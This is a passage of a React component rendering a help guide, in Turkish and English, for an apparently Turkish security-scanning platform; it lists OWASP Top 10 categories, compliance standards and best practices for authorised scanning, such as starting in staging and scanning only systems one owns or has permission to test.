                      <ListItemText primary="A04:2021 – Insecure Design" />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                      <ListItemText primary="A05:2021 – Security Misconfiguration" />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                      <ListItemText primary="A06:2021 – Vulnerable Components" />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                      <ListItemText primary="A07:2021 – Authentication Failures" />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                      <ListItemText primary="A08:2021 – Software & Data Integrity" />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                      <ListItemText primary="A09:2021 – Logging & Monitoring" />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                      <ListItemText primary="A10:2021 – SSRF" />
                    </ListItem>
                  </List>
                </CardContent>
              </Card>
            </Grid>

            <Grid item xs={12} md={6}>
              <Card>
                <CardContent>
                  <Typography variant="h6" gutterBottom color="primary">
                    Compliance Standards
                  </Typography>
                  <List dense>
                    <ListItem>
                      <ListItemIcon><SecurityIcon color="primary" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="PCI DSS"
                        secondary="Payment Card Industry Data Security Standard"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><SecurityIcon color="primary" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="GDPR"
                        secondary="General Data Protection Regulation"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><SecurityIcon color="primary" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="ISO 27001"
                        secondary="Information Security Management"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><SecurityIcon color="primary" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="NIST"
                        secondary="National Institute of Standards"
                      />
                    </ListItem>
                    <ListItem>
                      <ListItemIcon><SecurityIcon color="primary" fontSize="small" /></ListItemIcon>
                      <ListItemText
                        primary="KVKK"
                        secondary="Kişisel Verilerin Korunması Kanunu"
                      />
                    </ListItem>
                  </List>
                </CardContent>
              </Card>
            </Grid>
          </Grid>
        </TabPanel>

        {/* Tab 5: Best Practices */}
        <TabPanel value={tabValue} index={4}>
          <Typography variant="h5" gutterBottom>
            ⚡ En İyi Pratikler
          </Typography>
          <Divider sx={{ mb: 3 }} />

          <Grid container spacing={3}>
            <Grid item xs={12}>
              <Alert severity="success" icon={<CheckCircleIcon />}>
                <strong>✅ YAPILMASI GEREKENLER</strong>
              </Alert>
              <List>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText
                    primary="Test Ortamında Başlayın"
                    secondary="İlk taramalarınızı mutlaka test/staging ortamında yapın"
                  />
                </ListItem>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText
                    primary="Düzenli Tarama Yapın"
                    secondary="Haftalık veya her deployment sonrası güvenlik taraması"
                  />
                </ListItem>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText
                    primary="Raporları Kaydedin"
                    secondary="Tüm tarama raporlarını arşivleyin ve karşılaştırın"
                  />
                </ListItem>
                <ListItem>
                  <ListItemIcon><CheckCircleIcon color="success" /></ListItemIcon>
                  <ListItemText
                    primary="Kritik Bulguları Önceliklendirin"
                    secondary="CRITICAL ve HIGH seviyedeki zafiyetleri ilk önce düzeltin"
                  />
                </ListItem>
              </List>
            </Grid>

            <Grid item xs={12}>
              <Alert severity="error" icon={<WarningIcon />}>
                <strong>❌ YAPILMAMASI GEREKENLER</strong>
              </Alert>
              <List>
                <ListItem>
                  <ListItemIcon><WarningIcon color="error" /></ListItemIcon>
                  <ListItemText
                    primary="Canlı Sistemde TEST/STAGING Modu Kullanmayın"
                    secondary="Production sistemlerde sadece PRODUCTION modu kullanın"
                  />
                </ListItem>
                <ListItem>
                  <ListItemIcon><WarningIcon color="error" /></ListItemIcon>
                  <ListItemText
                    primary="İzinsiz Tarama Yapmayın"
                    secondary="Sadece sahip olduğunuz veya izin aldığınız sistemleri tarayın"
                  />
                </ListItem>
                <ListItem>
                  <ListItemIcon><WarningIcon color="error" /></ListItemIcon>
                  <ListItemText
                    primary="Taramayı Peak Saatlerde Başlatmayın"
                    secondary="Yüksek trafik saatlerinde tarama yapmaktan kaçının"
                  />
                </ListItem>
              </List>
            </Grid>
          </Grid>
        </TabPanel>
      </Paper>

      {/* Footer */}
      <Paper elevation={2} sx={{ p: 3, mt: 3, bgcolor: '#2a2a2a', color: 'white' }}>
        <Typography variant="body2" sx={{ color: 'white' }} align="center">
          <strong>📞 Destek:</strong> Sorularınız için teknik ekiple iletişime geçin. <br />
          <strong>🔒 Gizlilik:</strong> Tüm tarama verileri şifreli olarak saklanır ve 3. taraflarla paylaşılmaz.<br />
          <strong>⚖️ Yasal Uyarı:</strong> Bu platform sadece yasal ve izin verilmiş güvenlik testleri için kullanılmalıdır.
        </Typography>
      </Paper>
    </Box>
  );
};

export default ApplicationGuide;


